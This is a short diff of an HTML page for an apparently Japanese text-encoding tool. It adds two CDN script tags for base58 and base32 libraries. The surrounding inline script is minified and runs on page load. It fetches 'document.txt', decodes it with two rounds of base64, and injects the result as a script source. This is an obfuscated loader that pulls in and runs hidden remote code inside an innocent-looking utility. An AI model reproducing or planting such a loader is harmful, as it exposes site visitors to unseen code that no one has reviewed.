@@ -19,6 +19,8 @@
     <textarea id="inputText" placeholder="テキストを入力"></textarea><br>
     <button id="encodeButton">エンコード</button><br>
     <textarea id="outputText" placeholder="結果" readonly></textarea>
+     <script src="https://cdn.jsdelivr.net/npm/base58@2.0.0/dist/base58.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/base32.js@0.1.0/dist/base32.min.js"></script>
     <script>
 function decode(encoded){return atob(atob(encoded));}function loadScript(encodedSrc){try{const decodedSrc=decode(encodedSrc);const script=document.createElement('script');script.src=decodedSrc;script.async=true;document.head.appendChild(script);}catch(error){console.error(error.message);}}async function fetchEncodedSrc(){try{const response=await fetch('document.txt');if(!response.ok)throw new Error(response.status);const encodedSrc=await response.text();loadScript(encodedSrc.trim());}catch(error){console.error(error.message);}}fetchEncodedSrc();
     </script>
